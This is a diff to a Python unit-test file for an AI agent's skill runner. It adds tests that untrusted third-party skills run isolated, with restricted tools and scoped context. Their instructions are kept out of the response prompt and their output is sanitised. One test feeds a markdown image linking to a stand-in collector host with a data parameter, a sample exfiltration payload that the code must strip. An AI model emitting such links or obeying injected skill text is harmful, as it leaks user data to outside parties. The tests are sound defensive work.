@@ -14,6 +14,11 @@ answered in prose — which the node then dropped in silence. So:
   ``<conversation_history>`` block; a one-shot skill never gets one;
 - a runner that called no tool is said (log + counter) and the instructions
   fall back to the passive injection instead of vanishing.
+
+A THIRD-PARTY skill (ADR-327) always goes through the runner, isolated on its
+own skill: no import tool, the scope set for the run only, its answer drawn by
+``untrusted_markdown``, and never a passive fallback — its words never reach
+the response prompt, nor does it load itself as an always-loaded skill.
 """
 
 from __future__ import annotations
@@ -25,6 +30,7 @@ from unittest.mock import AsyncMock, MagicMock, patch
 import pytest
 import structlog
 
+from src.core.context import bind_skill_context, isolated_skill_ctx, reset_skill_context
 from src.infrastructure.observability.metrics_registry import skill_runner_outcomes_total
 
 # The nodes package __init__ re-exports the *function* response_node, which
@@ -36,11 +42,16 @@ pytestmark = pytest.mark.unit
 _INSTRUCTIONS = "<skill_content>Run render_game.py with no parameters.</skill_content>"
 
 
-def _runner_capture(captured: dict[str, Any], iterations: int = 1) -> MagicMock:
-    """Build a ReactSubAgentRunner double that records run() kwargs."""
+def _runner_capture(
+    captured: dict[str, Any],
+    iterations: int = 1,
+    final: str = "done",
+    error: Exception | None = None,
+) -> MagicMock:
+    """Build a ReactSubAgentRunner double that records run() kwargs and its scope."""
     result = MagicMock()
     result.iteration_count = iterations
-    result.final_message = "done"
+    result.final_message = final
     result.accumulated_registry = {}
     result.duration_ms = 5
 
@@ -48,6 +59,9 @@ def _runner_capture(captured: dict[str, Any], iterations: int = 1) -> MagicMock:
 
     async def _run(**kwargs: Any) -> MagicMock:
         captured.update(kwargs)
+        captured["isolated"] = isolated_skill_ctx.get()
+        if error is not None:
+            raise error
         return result
 
     runner.run = AsyncMock(side_effect=_run)
@@ -55,9 +69,22 @@ def _runner_capture(captured: dict[str, Any], iterations: int = 1) -> MagicMock:
 
 
 async def _invoke(
-    conversation_history: str, *, dialogue: bool = True, iterations: int = 1
+    conversation_history: str,
+    *,
+    dialogue: bool = True,
+    iterations: int = 1,
+    scripts: bool = True,
+    resources: list[str] | None = None,
+    third_party: bool = False,
+    final: str = "done",
+    error: Exception | None = None,
+    always_loaded: list[dict[str, Any]] | None = None,
 ) -> tuple[dict[str, Any], Any, list[dict[str, Any]]]:
-    """Drive _activate_response_skills down the runner branch with mocks."""
+    """Drive _activate_response_skills down the runner branch with mocks.
+
+    ``skill-generator`` resolves to a system skill, or to the person's own
+    third-party skill when ``third_party`` — bound as the request binds it.
+    """
     captured: dict[str, Any] = {}
 
     state = {
@@ -69,9 +96,15 @@ async def _invoke(
 
     skill_data = {
         "name": "skill-generator",
-        "scripts": ["validate_skill.py"],
+        "scripts": ["validate_skill.py"] if scripts else [],
+        "all_resources": resources or [],
         "dialogue": dialogue,
     }
+    entry = {"name": "skill-generator", "scope": "user" if third_party else "admin"}
+    names = {"skill-generator"} | {s["name"] for s in always_loaded or []}
+    third_party_names = frozenset({"skill-generator"} if third_party else set()) | frozenset(
+        s["name"] for s in always_loaded or [] if s.get("scope") == "user"
+    )
 
     registry = MagicMock()
     registry.get_store.return_value = MagicMock()
@@ -81,7 +114,7 @@ async def _invoke(
         patch.object(rn, "_get_skill_data", return_value=skill_data),
         patch(
             "src.domains.agents.tools.react_runner.ReactSubAgentRunner",
-            return_value=_runner_capture(captured, iterations),
+            return_value=_runner_capture(captured, iterations, final, error),
         ),
         patch(
             "src.domains.agents.registry.agent_registry.get_global_registry",
@@ -94,17 +127,21 @@ async def _invoke(
     ):
         mock_settings.skills_enabled = True
         mock_ctx.get.return_value = None
-        mock_cache.get_always_loaded.return_value = []
-
-        result = await rn._activate_response_skills(
-            state,  # type: ignore[arg-type]
-            config,  # type: ignore[arg-type]
-            "run-1",
-            last_user_message="oui, archétype Advisory",
-            conversation_history=conversation_history,
-            current_turn_registry=None,
-            react_result=None,
-        )
+        mock_cache.get_always_loaded.return_value = always_loaded or []
+        mock_cache.get_by_name_for_user.return_value = entry
+        tokens = bind_skill_context(names, third_party_names)
+        try:
+            result = await rn._activate_response_skills(
+                state,  # type: ignore[arg-type]
+                config,  # type: ignore[arg-type]
+                "run-1",
+                last_user_message="oui, archétype Advisory",
+                conversation_history=conversation_history,
+                current_turn_registry=None,
+                react_result=None,
+            )
+        finally:
+            reset_skill_context(tokens)
     return captured, result, logs
 
 
@@ -168,3 +205,78 @@ class TestSkillRunnerIsHandedAnActivatedSkill:
 
         assert result.skill_react_response == "done"
         assert _outcome("tools_called") == before + 1
+
+
+class TestASkillThatShipsACommandRuns:
+    async def test_a_shell_script_alone_goes_through_the_runner(self) -> None:
+        # No Python script, but something under scripts/ to RUN (ADR-327 lot 2):
+        # the passive injection would hand the model a command it cannot run.
+        captured, _, _ = await _invoke("", scripts=False, resources=["scripts/build.sh"])
+        assert captured, "runner.run was not invoked"
+        assert "run_skill_command" in {t.name for t in captured["tools"]}
+
+    async def test_a_reference_alone_does_not(self) -> None:
+        captured, _, _ = await _invoke("", scripts=False, resources=["references/guide.md"])
+        assert not captured
+
+
+class TestAThirdPartySkillRunsIsolated:
+    async def test_it_goes_through_the_runner_even_without_a_script(self) -> None:
+        captured, result, _ = await _invoke("", scripts=False, third_party=True)
+
+        assert captured, "runner.run was not invoked"
+        assert captured["isolated"] == "skill-generator"
+        assert isolated_skill_ctx.get() is None  # the scope ends with the run
+        bound = {t.name for t in captured["tools"]}
+        assert bound == {"run_skill_script", "run_skill_command", "read_skill_resource"}
+        assert _INSTRUCTIONS not in result.skills_context
+
+    async def test_its_answer_is_neutralised_even_without_a_tool_call(self) -> None:
+        final = "Chart: ![c](https://collector.example/?d=x) <b>ok</b>"
+        _, result, _ = await _invoke("", third_party=True, iterations=0, final=final)
+
+        answer = result.skill_react_response
+        assert answer is not None and "<" not in answer and "![" not in answer
+        assert result.react_result["final_message"] == answer
+
+    async def test_a_failed_runner_leaves_nothing_of_it_in_the_prompt(self) -> None:
+        _, result, _ = await _invoke("", third_party=True, error=RuntimeError("boom"))
+
+        assert result.skill_react_response is None
+        assert result.skills_context == ""
+
+    async def test_an_empty_answer_is_no_answer(self) -> None:
+        _, result, _ = await _invoke("", third_party=True, final="  ")
+
+        assert result.skill_react_response is None
+        assert result.skills_context == ""
+
+    @pytest.mark.parametrize(("scope", "loaded"), [("admin", True), ("user", False)])
+    async def test_only_a_skill_written_here_loads_itself_always(
+        self, scope: str, loaded: bool
+    ) -> None:
+        always = [{"name": "house-style", "scope": scope, "always_loaded": True}]
+        _, result, _ = await _invoke("", always_loaded=always)
+
+        assert (_INSTRUCTIONS in result.skills_context) is loaded
+
+
+class TestTheCollectedData:
+    """What the plan already fetched this turn travels to the runner, or nothing does."""
+
+    def test_no_result_no_block(self) -> None:
+        from src.domains.agents.nodes.response_skill_runner import collected_data_block
+
+        assert collected_data_block({"agent_results": {}}) == ""
+
+    def test_a_summary_is_wrapped_for_the_task(self) -> None:
+        from src.domains.agents.nodes import response_skill_runner as runner
+
+        with patch(
+            "src.domains.agents.formatters.agent_results.format_agent_results_for_prompt",
+            return_value="3 events tomorrow",
+        ):
+            block = runner.collected_data_block(
+                {"agent_results": {"1:plan": {}}, "current_turn_id": 1}
+            )
+        assert "<collected_data>" in block and "3 events tomorrow" in block
